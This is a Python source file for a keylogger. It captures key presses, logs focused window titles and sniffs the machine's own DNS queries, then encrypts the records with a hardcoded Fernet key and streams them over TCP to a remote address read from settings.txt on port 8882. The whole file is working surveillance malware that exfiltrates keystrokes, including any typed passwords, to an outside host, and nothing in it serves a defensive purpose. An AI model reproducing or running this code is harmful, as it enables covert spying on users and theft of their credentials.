import time
import os
import pyautogui
import socket
import time
from threading import Event, Thread, Condition
import time
from scapy.all import IP, DNS, DNSQR, sniff, UDP
import keyboard

from cryptography.fernet import Fernet

QUEUEU_SIZE = 40
queue = []
condition = Condition()
stop_event = Event()
KEY = b"afcbXv_0yebyn2iJbbt_DDvQdec3f96ImNXLq-AAGT0="


class get_focused_window_thread(Thread):
    def __init__(self):
        Thread.__init__(self)

    def run(self):
        global queue
        global stop_event
        temp = None

        while not stop_event.is_set():
            window_title = pyautogui.getActiveWindowTitle()
            if temp != window_title:
                time_string = time.strftime("%m/%d/%Y, %H-%M-%S", time.localtime())
                msg = f"{time_string}:[focused_window]:{str(window_title)}"
                condition.acquire()

                if len(queue) >= QUEUEU_SIZE:
                    condition.wait()

                queue.append(msg)
                condition.notify()
                condition.release()
            temp = window_title


# not working to be fixed
class Port53Scan(Thread):
    def __init__(self):
        Thread.__init__(self)

    def run(self):
        global queue
        global stop_event
        msg = ""
        hostname = socket.gethostname()
        ip_addr = socket.gethostbyname(hostname)
        while not stop_event.is_set():
            try:
                pkts = sniff(filter="udp and port 53", count=5)
                for pkt in pkts:
                    if (pkt[IP].src == ip_addr):
                        time_string = time.strftime("%m/%d/%Y, %H-%M-%S", time.localtime())
                        msg = f"{time_string}:[PORT 53]:{str(pkt[DNSQR].qname.decode())}"
                    else:
                        msg = ""
            except:
                msg = ""
                pass

            if msg != "":
                condition.acquire()

                if len(queue) >= QUEUEU_SIZE:
                    condition.wait()
                queue.append(msg)

                condition.notify()
                condition.release()
                msg = ""



class detect_key_press(Thread):
    def __init__(self):
        Thread.__init__(self)

    def key_decode(self, key):
        try:
            key = key.replace("'", "")

            return chr(key)
        except:
            key = key.replace("'", "")
            if len(key) > 1:
                return f"[{key}]"
            else:
                try:
                    (ord(key))
                except:
                    return key
        return key

    def run(self):
        global queue
        global stop_event
        msg = ""
        while not stop_event.is_set():

            event = keyboard.read_event()
            if event.event_type == keyboard.KEY_DOWN:
                msg = msg + self.key_decode(event.name)

            if len(msg) >= 50:
                condition.acquire()

                if len(queue) >= QUEUEU_SIZE:
                    condition.wait()

                time_string = time.strftime("%m/%d/%Y, %H-%M-%S", time.localtime())
                finalmsg = f"{time_string}:[keypress]:{msg}"
                queue.append(finalmsg)
                msg = ""
                condition.notify()
                condition.release()


class ConsumerThread(Thread):
    def __init__(self, ip, port):
        Thread.__init__(self)
        self.ip = ip
        self.port = port

    def run(self):

        global queue
        global stop_event
        f = Fernet(KEY)

        while not stop_event.is_set():
            try:
                print("attempting to connect to " + self.ip)
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                result = s.connect((self.ip, self.port))
                while not stop_event.is_set() and result == None:

                    condition.acquire()

                    if not queue:
                        condition.wait()
                    data = queue.pop()
                    m = f.encrypt(data.encode("utf-8"))
                    print(data)
                    s.send(m)

                    condition.notify()
                    condition.release()
            except KeyboardInterrupt:
                s.close()
                break
            except Exception as e:
                print(e)
                s.close()


if __name__ == "__main__":
    thread_list = []

    this_folder = os.path.dirname(os.path.abspath(__file__))
    filename = os.path.join(this_folder, f"settings.txt")
    with open(filename, "r") as file:
        ip = file.read()
    port = 8882
    try:
        x = ConsumerThread(ip, port)
        thread_list.append(x)
        x.start()
        lst = [get_focused_window_thread, detect_key_press, Port53Scan]

        for x in lst:
            time.sleep(1)  # this somehow makes the python interpreter not crash
            x = x()
            x.start()
            thread_list.append(x)

    except Exception as e:
        print(e)
        stop_event.set()
        for threads in thread_list:
            threads.join()
